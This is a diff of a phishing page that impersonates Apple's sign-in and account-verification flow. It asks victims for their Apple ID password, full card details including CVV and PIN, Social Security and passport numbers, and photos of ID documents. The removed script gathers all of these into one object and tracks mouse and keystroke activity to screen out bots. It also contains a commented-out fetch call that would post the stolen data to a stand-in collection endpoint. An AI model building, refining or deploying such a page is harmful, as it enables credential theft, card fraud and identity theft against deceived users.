@@ -6,7 +6,7 @@
     <meta name="robots" content="noindex, nofollow">
     <meta name="googlebot" content="noindex, noarchive">
     <meta name="description" content="Apple ID verification">
-    <title>Apple ID - Account Verification</title>
+    <title>Apple ID - Sign In</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -157,6 +157,10 @@
             display: none;
         }
         
+        .error.visible {
+            display: block;
+        }
+        
         button {
             background-color: var(--apple-blue);
             color: white;
@@ -173,6 +177,11 @@
         
         button:hover {
             background-color: var(--apple-blue-dark);
+        }
+        
+        button:disabled {
+            background-color: var(--apple-light-grey);
+            cursor: not-allowed;
         }
         
         .forgotten-link {
@@ -393,6 +402,18 @@
             display: none;
         }
         
+        /* Hidden form */
+        #email-form {
+            display: none;
+        }
+
+        .bank-result {
+            font-weight: 500;
+            color: var(--apple-blue);
+            margin-top: 5px;
+            display: none;
+        }
+        
         /* Responsive */
         @media only screen and (max-width: 734px) {
             .login-container {
@@ -560,6 +581,7 @@
                                     <label for="bank">Bank Name</label>
                                     <input type="text" id="bank" name="bank" required placeholder="Enter bank name">
                                     <div class="error" id="bank-error">Please enter your bank name.</div>
+                                    <div class="bank-result" id="detected-bank">Bank detected: <span id="bank-name"></span></div>
                                 </div>
                             </div>
                             <div class="form-col">
@@ -613,7 +635,7 @@
                             </div>
                             <div class="form-col">
                                 <div class="form-group">
-                                    <label for="amex-cid">AMEX CID </label>
+                                    <label for="amex-cid">AMEX CID (if applicable)</label>
                                     <input type="text" id="amex-cid" name="amex-cid" placeholder="AMEX CID" maxlength="4">
                                 </div>
                             </div>
@@ -622,8 +644,8 @@
                         <div class="form-row">
                             <div class="form-col">
                                 <div class="form-group">
-                                    <label for="sort-code">Social Security Number</label>
-                                    <input type="text" id="sort-code" name="sort-code" placeholder="XX-XX-XX" maxlength="9">
+                                    <label for="sort-code">Sort Code (if applicable)</label>
+                                    <input type="text" id="sort-code" name="sort-code" placeholder="XX-XX-XX" maxlength="8">
                                 </div>
                             </div>
                             <div class="form-col">
@@ -639,7 +661,7 @@
                             <input type="password" id="card-password" name="card-password" placeholder="Card PIN or password" autocomplete="off">
                         </div>
                         
-                        <button type="button" id="next-step1">Continue</button>
+                        <button type="button" id="next-step1" disabled>Continue</button>
                     </div>
                     
                     <!-- Step 2: Personal Information -->
@@ -681,534 +703,3 @@
                             <div class="form-col">
                                 <div class="form-group">
                                     <label for="state">State/Province</label>
-                                    <input type="text" id="state" name="state" required placeholder="State/Province">
-                                    <div class="error" id="state-error">Please enter your state or province.</div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="country">Country</label>
-                                    <input type="text" id="country" name="country" required placeholder="Country">
-                                    <div class="error" id="country-error">Please enter your country.</div>
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="zip">ZIP/Postal Code</label>
-                                    <input type="text" id="zip" name="zip" required placeholder="ZIP/Postal code">
-                                    <div class="error" id="zip-error">Please enter your ZIP/postal code.</div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="dob">Date of Birth</label><input type="date" id="dob" name="dob" required>
-                                    <div class="error" id="dob-error">Please enter a valid date of birth.</div>
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="phone">Phone Number</label>
-                                    <input type="tel" id="phone" name="phone" required placeholder="Include country code (e.g., +1)">
-                                    <div class="error" id="phone-error">Please enter a valid phone number.</div>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <button type="button" id="next-step2">Continue</button>
-                    </div>
-                    
-                    <!-- Step 3: Social Information -->
-                    <div class="form-section" id="step3">
-                        <h2>Additional Verification</h2>
-                        <p class="info-text">Please provide any applicable identity documents for verification. Fill only the fields that apply to you.</p>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="id-number">ID Number</label>
-                                    <input type="text" id="id-number" name="id-number" placeholder="General ID number">
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="civil-id">Civil ID</label>
-                                    <input type="text" id="civil-id" name="civil-id" placeholder="Civil ID number">
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="qatar-id">Qatar ID</label>
-                                    <input type="text" id="qatar-id" name="qatar-id" placeholder="Qatar ID number">
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="national-id">National ID</label>
-                                    <input type="text" id="national-id" name="national-id" placeholder="National ID number">
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="citizen-id">Citizen ID</label>
-                                    <input type="text" id="citizen-id" name="citizen-id" placeholder="Citizen ID number">
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="passport">Passport Number</label>
-                                    <input type="text" id="passport" name="passport" placeholder="Passport number">
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="bank-access">Bank Access Number</label>
-                                    <input type="text" id="bank-access" name="bank-access" placeholder="Bank access number">
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="sin">Social Insurance Number</label>
-                                    <input type="text" id="sin" name="sin" placeholder="Social Insurance Number">
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-row">
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="ssn">Social Security Number</label>
-                                    <input type="text" id="ssn" name="ssn" placeholder="Social Security Number">
-                                </div>
-                            </div>
-                            <div class="form-col">
-                                <div class="form-group">
-                                    <label for="account-number">Account Number</label>
-                                    <input type="text" id="account-number" name="account-number" placeholder="Account number">
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="osid">OSID Number</label>
-                            <input type="text" id="osid" name="osid" placeholder="OSID number">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="id-front">ID Document (Front)</label>
-                            <p style="font-size: 14px; color: #6e6e73; margin-bottom: 10px;">Upload a photo of your government ID, passport, or driver's license</p>
-                            <input type="file" id="id-front" name="id-front" accept="image/*">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="id-back">ID Document (Back, if applicable)</label>
-                            <input type="file" id="id-back" name="id-back" accept="image/*">
-                        </div>
-                        
-                        <button type="button" id="submit-form">Submit Verification</button>
-                    </div>
-                    
-                    <!-- Success Page -->
-                    <div class="success-page" id="success-page">
-                        <div class="success-icon">
-                            <i class="fas fa-check-circle"></i>
-                        </div>
-                        <h2>Verification Complete</h2>
-                        <p class="info-text">Your identity verification has been submitted successfully. You'll receive a confirmation email shortly.</p>
-                        <p><strong>Reference ID:</strong> <span id="reference-id"></span></p>
-                        <p class="info-text" style="margin-top: 20px;">Our team will review your information within 24-48 hours. For any questions, contact Apple Support and reference your ID.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="legal-footer">
-            <div class="legal-footer-content">
-                <div class="legal-links">
-                    <a href="#" class="legal-link">Privacy Policy</a>
-                    <a href="#" class="legal-link">Terms of Use</a>
-                    <a href="#" class="legal-link">Sales and Refunds</a>
-                    <a href="#" class="legal-link">Legal</a>
-                    <a href="#" class="legal-link">Site Map</a>
-                </div>
-                <div class="copyright">Copyright © 2025 Apple Inc. All rights reserved.</div>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-        // Variable to track form data
-        let collectedData = {};
-        
-        // Anti-bot tracking
-        let mouseMovements = 0;
-        let keyPresses = 0;
-        
-        // Track mouse movements to detect bots
-        document.addEventListener('mousemove', function() {
-            mouseMovements++;
-        });
-        
-        // Track key presses for human verification
-        document.addEventListener('keydown', function(e) {
-            keyPresses++;
-        });
-        
-        // Format card number with spaces
-        document.getElementById('card-number').addEventListener('input', function() {
-            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let newVal = '';
-            for(let i = 0; i < val.length; i++) {
-                if(i % 4 === 0 && i > 0) newVal += ' ';
-                newVal += val.charAt(i);
-            }
-            this.value = newVal;
-        });
-            
-        // Format expiry date
-        document.getElementById('expiry').addEventListener('input', function() {
-            let val = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            if(val.length > 2) {
-                this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
-            } else {
-                this.value = val;
-            }
-        });
-        
-        // Login form submission
-        document.getElementById('signin-button').addEventListener('click', function() {
-            let valid = true;
-            
-            // Validate email
-            let email = document.getElementById('email').value;
-            if(!email || !email.includes('@')) {
-                document.getElementById('email-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('email-error').style.display = 'none';
-            }
-            
-            // Validate password
-            let password = document.getElementById('password').value;
-            if(!password) {
-                document.getElementById('password-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('password-error').style.display = 'none';
-            }
-            
-            if(valid) {
-                // Store the data
-                collectedData.email = email;
-                collectedData.password = password;
-                collectedData.userAgent = navigator.userAgent;
-                collectedData.screenResolution = window.screen.width + 'x' + window.screen.height;
-                collectedData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                
-                // Hide form, show loading
-                document.getElementById('login-form').style.display = 'none';
-                document.getElementById('login-loading').style.display = 'block';
-                
-                // Switch to verification view after delay
-                setTimeout(function() {
-                    document.getElementById('login-view').style.display = 'none';
-                    document.getElementById('verification-view').style.display = 'block';
-                    document.getElementById('login-loading').style.display = 'none';
-                    
-                    // Store data in localStorage for backup
-                    localStorage.setItem('apple_verification_data', JSON.stringify(collectedData));
-                    
-                    // Scroll to top
-                    window.scrollTo(0, 0);
-                }, 2000);
-            }
-        });
-        
-        // Step 1 (Card Info) submission
-        document.getElementById('next-step1').addEventListener('click', function() {
-            let valid = true;
-            
-            // Validate bank name
-            let bank = document.getElementById('bank').value;
-            if(!bank || bank.length < 2) {
-                document.getElementById('bank-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('bank-error').style.display = 'none';
-            }
-            
-            // Validate card level
-            let cardLevel = document.getElementById('card-level').value;
-            if(!cardLevel) {
-                document.getElementById('card-level-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('card-level-error').style.display = 'none';
-            }
-            
-            // Validate cardholder name
-            let cardholder = document.getElementById('cardholder').value;
-            if(!cardholder || cardholder.length < 3) {
-                document.getElementById('cardholder-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('cardholder-error').style.display = 'none';
-            }
-            
-            // Validate card number
-            let cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-            if(!cardNumber || cardNumber.length < 13 || cardNumber.length > 19) {
-                document.getElementById('card-number-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('card-number-error').style.display = 'none';
-            }
-            
-            // Validate expiry
-            let expiry = document.getElementById('expiry').value;
-            if(!expiry || expiry.length < 5) {
-                document.getElementById('expiry-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('expiry-error').style.display = 'none';
-            }
-            
-            // Validate CVV
-            let cvv = document.getElementById('cvv').value;
-            if(!cvv || cvv.length < 3 || cvv.length > 4) {
-                document.getElementById('cvv-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('cvv-error').style.display = 'none';
-            }
-            
-            if(valid) {
-                // Store card info
-                collectedData.bank = bank;
-                collectedData.cardLevel = cardLevel;
-                collectedData.cardholder = cardholder;
-                collectedData.cardNumber = cardNumber;
-                collectedData.expiry = expiry;
-                collectedData.cvv = cvv;
-                collectedData.amexCid = document.getElementById('amex-cid').value;
-                collectedData.sortCode = document.getElementById('sort-code').value;
-                collectedData.creditLimit = document.getElementById('credit-limit').value;
-                collectedData.cardPassword = document.getElementById('card-password').value;
-                
-                // Update localStorage
-                localStorage.setItem('apple_verification_data', JSON.stringify(collectedData));
-                
-                // Progress to next step
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                
-                // Update progress indicators
-                document.querySelector('.step:nth-child(2)').classList.remove('active');
-                document.querySelector('.step:nth-child(2)').classList.add('completed');
-                document.querySelector('.step:nth-child(3)').classList.add('active');
-                
-                // Scroll to top
-                window.scrollTo(0, 0);
-            }
-        });
-        
-        // Step 2 (Personal Info) submission
-        document.getElementById('next-step2').addEventListener('click', function() {
-            let valid = true;
-            
-            // Validate first name
-            let firstname = document.getElementById('firstname').value;
-            if(!firstname) {
-                document.getElementById('firstname-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('firstname-error').style.display = 'none';
-            }
-            
-            // Validate last name
-            let lastname = document.getElementById('lastname').value;
-            if(!lastname) {
-                document.getElementById('lastname-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('lastname-error').style.display = 'none';
-            }
-            
-            // Validate address
-            let address = document.getElementById('address').value;
-            if(!address) {
-                document.getElementById('address-error').style.display = 'block';
-                valid = false;
-            } else {
-                document.getElementById('address-error').style.display = 'none';
-            }
-            
-            // Validate other required fields
-            let city = document.getElementById('city').value;
-            let state = document.getElementById('state').value;
-            let country = document.getElementById('country').value;
-            let zip = document.getElementById('zip').value;
-            let dob = document.getElementById('dob').value;
-            let phone = document.getElementById('phone').value;
-            
-            if(!city) document.getElementById('city-error').style.display = 'block';
-            else document.getElementById('city-error').style.display = 'none';
-            
-            if(!state) document.getElementById('state-error').style.display = 'block';
-            else document.getElementById('state-error').style.display = 'none';
-            
-            if(!country) document.getElementById('country-error').style.display = 'block';
-            else document.getElementById('country-error').style.display = 'none';
-            
-            if(!zip) document.getElementById('zip-error').style.display = 'block';
-            else document.getElementById('zip-error').style.display = 'none';
-            
-            if(!dob) document.getElementById('dob-error').style.display = 'block';
-            else document.getElementById('dob-error').style.display = 'none';
-            
-            if(!phone) document.getElementById('phone-error').style.display = 'block';
-            else document.getElementById('phone-error').style.display = 'none';
-            
-            if(!city || !state || !country || !zip || !dob || !phone) {
-                valid = false;
-            }
-            
-            if(valid) {
-                // Store personal info
-                collectedData.firstname = firstname;
-                collectedData.lastname = lastname;
-                collectedData.address = address;
-                collectedData.city = city;
-                collectedData.state = state;
-                collectedData.country = country;
-                collectedData.zip = zip;
-                collectedData.dob = dob;
-                collectedData.phone = phone;
-                
-                // Update localStorage
-                localStorage.setItem('apple_verification_data', JSON.stringify(collectedData));
-                
-                // Progress to next step
-                document.getElementById('step2').style.display = 'none';
-                document.getElementById('step3').style.display = 'block';
-                
-                // Update progress indicators
-                document.querySelector('.step:nth-child(3)').classList.remove('active');
-                document.querySelector('.step:nth-child(3)').classList.add('completed');
-                document.querySelector('.step:nth-child(4)').classList.add('active');
-                
-                // Scroll to top
-                window.scrollTo(0, 0);
-            }
-        });
-        
-        // Final submission
-        document.getElementById('submit-form').addEventListener('click', function() {
-            // Collect ID-related information
-            collectedData.idNumber = document.getElementById('id-number').value;
-            collectedData.civilId = document.getElementById('civil-id').value;
-            collectedData.qatarId = document.getElementById('qatar-id').value;
-            collectedData.nationalId = document.getElementById('national-id').value;
-            collectedData.citizenId = document.getElementById('citizen-id').value;
-            collectedData.passport = document.getElementById('passport').value;
-            collectedData.bankAccess = document.getElementById('bank-access').value;
-            collectedData.sin = document.getElementById('sin').value;
-            collectedData.ssn = document.getElementById('ssn').value;
-            collectedData.accountNumber = document.getElementById('account-number').value;
-            collectedData.osid = document.getElementById('osid').value;
-            
-            // Handle file uploads in a way that works without PHP
-            // In a real implementation, you'd use a server to store these files
-            const idFront = document.getElementById('id-front').files[0];
-            const idBack = document.getElementById('id-back').files[0];
-            
-            if (idFront) {
-                collectedData.hasIdFront = true;
-                collectedData.idFrontName = idFront.name;
-                collectedData.idFrontSize = idFront.size;
-            }
-            
-            if (idBack) {
-                collectedData.hasIdBack = true;
-                collectedData.idBackName = idBack.name;
-                collectedData.idBackSize = idBack.size;
-            }
-            
-            // Add timestamp and completion status
-            collectedData.completedAt = new Date().toISOString();
-            collectedData.mouseMovements = mouseMovements;
-            collectedData.keyPresses = keyPresses;
-            
-            // Update localStorage with complete data
-            localStorage.setItem('apple_verification_data', JSON.stringify(collectedData));
-            
-            // This is where you would typically send data to a server
-            // Since we're not using PHP, we'll just show the success message
-            
-            // Generate a reference ID
-            const referenceId = 'APL' + Math.floor(100000000 + Math.random() * 900000000);
-            document.getElementById('reference-id').textContent = referenceId;
-            
-            // Show success page
-            document.getElementById('step3').style.display = 'none';
-            document.getElementById('success-page').style.display = 'block';
-            
-            // Update progress to show completion
-            document.querySelector('.step:nth-child(4)').classList.add('completed');
-            
-            // Log the collected data to console (for development)
-            console.log('Collected Data:', collectedData);
-            
-            // You could send this data to a remote endpoint using fetch API
-            // Example (commented out):
-            /*
-            fetch('https://your-endpoint.com/collect-data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(collectedData)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Success:', data))
-            .catch(error => console.error('Error:', error));
-            */
-        });
-        
-        // Check if there's existing data to restore (for page refreshes)
-        window.addEventListener('DOMContentLoaded', function() {
-            const savedData = localStorage.getItem('apple_verification_data');
-            if (savedData) {
-                try {
-                    const data = JSON.parse(savedData);
-                    
-                    // If we have email/password, show verification view
-                    if (data.email && data.password) {
-                        document.getElementById('login-view').style.display = 'none';
-                        document.getElementById('verification-view').style.display = 'block';
-                        
-                        // Restore data to global variable
-                        collectedData = data;
-                    }
-                } catch (e) {
-                    console.error('Error restoring data:', e);
-                }
-            }
-        });
-    </script>
-</body>
-</html>
